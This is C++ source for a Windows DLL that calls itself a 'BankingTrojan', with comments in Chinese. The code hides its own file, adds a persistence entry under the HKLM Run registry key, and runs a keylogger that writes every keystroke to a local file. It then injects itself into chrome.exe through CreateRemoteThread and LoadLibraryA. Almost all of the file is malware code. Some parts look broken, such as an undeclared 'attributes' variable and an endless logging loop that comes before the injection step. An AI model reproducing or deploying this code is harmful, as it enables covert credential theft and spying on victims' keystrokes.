#include <windows.h>
#include "pch.h"                
#include <cstdio>               
#include <tlhelp32.h>           
#include <iostream>
#include <shlwapi.h>
#include <fstream>
#pragma comment(lib, "Shlwapi.lib")

using namespace std;


BOOL AddRegisterKey(LPCWSTR appName, LPCWSTR appPath) {
    HKEY hKey;
    LONG result;
    result = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",            // 子項路徑
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,              // 需要寫入權限
        NULL,
        &hKey,
        NULL
    );

    result = RegSetValueExW(
        hKey,
        appName,                 // 鍵值名稱 (應用程式名稱)
        0,
        REG_SZ,                  // 鍵值類型：字串 (REG_SZ)
        (const BYTE*)appPath,    // 應用程式路徑
        (wcslen(appPath) + 1) * sizeof(wchar_t) // 字串大小 (以字節計)
    );

    RegCloseKey(hKey); // 關閉註冊表鍵句柄

    return (result == ERROR_SUCCESS);
}

DWORD GetProcessIDByName(const std::wstring& processName) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to take snapshot of processes" << std::endl;
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);


    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                CloseHandle(hProcessSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return 0;
}

void CharToWChar(const char* charArray, wchar_t* wcharArray, int size)
{
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wcharArray, size);
}

void LogKey(const std::wstring& filePath, int key) {
    wchar_t keyName[32];

    // 根據按鍵的虛擬鍵碼判斷是特殊鍵還是普通鍵
    switch (key) {
    case VK_SHIFT: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[SHIFT]"); break;
    case VK_BACK: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[BACKSPACE]"); break;
    case VK_LBUTTON: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[LBUTTON]"); break;
    case VK_RBUTTON: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[RBUTTON]"); break;
    case VK_RETURN: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[ENTER]"); break;
    case VK_TAB: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[TAB]"); break;
    case VK_ESCAPE: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[ESCAPE]"); break;
    case VK_CONTROL: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[Ctrl]"); break;
    case VK_MENU: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[Alt]"); break;
    case VK_CAPITAL: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[CAPS Lock]"); break;
    case VK_SPACE: wcscpy_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[SPACE]"); break;
    default:
        if (key >= 32 && key <= 126) { // 判斷是否是可顯示字符
            swprintf_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"%c", key);
        }
        else {
            swprintf_s(keyName, sizeof(keyName) / sizeof(wchar_t), L"[0x%02X]", key);
        }
        break;
    }

    // 開啟檔案並寫入按鍵記錄
    std::wofstream logFile(filePath, std::ios::app);
    if (logFile.is_open()) {
        logFile << keyName;
        logFile.close();
    }
}

// 獲取日志文件的完整路徑
std::wstring GetLogFilePath(HMODULE hModule) {
    wchar_t dllPath[MAX_PATH];
    wchar_t filePath[MAX_PATH];

    if (GetModuleFileNameW(hModule, dllPath, MAX_PATH) == 0) {
        return L""; // 若取得路徑失敗，返回空字串
    }
    PathRemoveFileSpecW(dllPath); // 移除檔案名稱部分
    PathCombineW(filePath, dllPath, L"BankingTrojanKeylogger.txt"); // 新增 keylogger.txt

    return std::wstring(filePath);
}

// 主函數：啟動鍵盤監控並記錄按鍵
BOOL CreateLog(HMODULE hModule) {
    std::wstring filePath = GetLogFilePath(hModule); // 獲取 log.txt 完整路徑

    // 隱藏控制台窗口
    FreeConsole();

    // 開始記錄按鍵
    while (true) {
        Sleep(10); // 每 10 毫秒檢查一次按鍵
        for (int i = 8; i <= 255; i++) { // 監聽所有按鍵
            if (GetAsyncKeyState(i) == -32767) { // 偵測按鍵是否按下
                LogKey(filePath, i); // 記錄按鍵
                Sleep(10); // 暫停 10 毫秒，避免過快寫入
            }
        }
    }

    return TRUE;
}

BOOL AutoHide(HMODULE hModule) {
    wchar_t dllPath[MAX_PATH];

    // 取得 DLL 的完整路徑
    if (GetModuleFileNameW(hModule, dllPath, MAX_PATH) == 0) {
        return FALSE; // 無法取得路徑
    }

    // 設置檔案屬性為「隱藏」
    if (SetFileAttributesW(dllPath, FILE_ATTRIBUTE_HIDDEN) == 0) {
        return FALSE; // 無法設置隱藏屬性
    }

    return TRUE;
}

BOOL AutoShow(HMODULE hModule) {
    wchar_t dllPath[MAX_PATH];

    // 取得 DLL 的完整路徑
    if (GetModuleFileNameW(hModule, dllPath, MAX_PATH) == 0) {
        return FALSE; // 無法取得路徑
    }

    // 設置檔案屬性為「隱藏」
    if (SetFileAttributesW(dllPath, attributes & ~FILE_ATTRIBUTE_HIDDEN) == 0) {
        return FALSE; // 無法設置隱藏屬性
    }

    return TRUE;
}



extern "C" __declspec(dllexport) void StartBankingTrojan() {

    HMODULE hModule = GetModuleHandle(L"BankingTrojan.dll");
    char dllname[MAX_PATH];
    DWORD pathLength = GetModuleFileNameA(hModule, dllname, MAX_PATH);
    std::wstring processName = L"chrome.exe";
    DWORD pid = GetProcessIDByName(processName);
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

    wchar_t wDllname[MAX_PATH];
    AutoHide(hModule);
    CharToWChar(dllname, wDllname, MAX_PATH);
    AddRegisterKey(L"BankingTrojan", wDllname);
    CreateLog(hModule);

    int size = strlen(dllname) + 1;
    PVOID procdlladdr = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (procdlladdr == NULL) {
        printf("handle %p VirtualAllocEx failed\n", hprocess);
    }

    SIZE_T writenum;

    if (!WriteProcessMemory(hprocess, procdlladdr, dllname, size, &writenum)) {
        printf("handle %p WriteProcessMemory failed\n", hprocess);
    }


    FARPROC loadfuncaddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (!loadfuncaddr) {
        DWORD err = GetLastError();
        printf("GetProcAddress failed. Error code: %lu\n", err);
    }


    HANDLE hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadfuncaddr, (LPVOID)procdlladdr, 0, NULL);
    if (!hthread) {
        DWORD err = GetLastError();
        printf("CreateRemoteThread failed. Error code: %lu\n", err);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        StartBankingTrojan();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        AutoShow(hModule);
        break;
    }
    return TRUE;
}
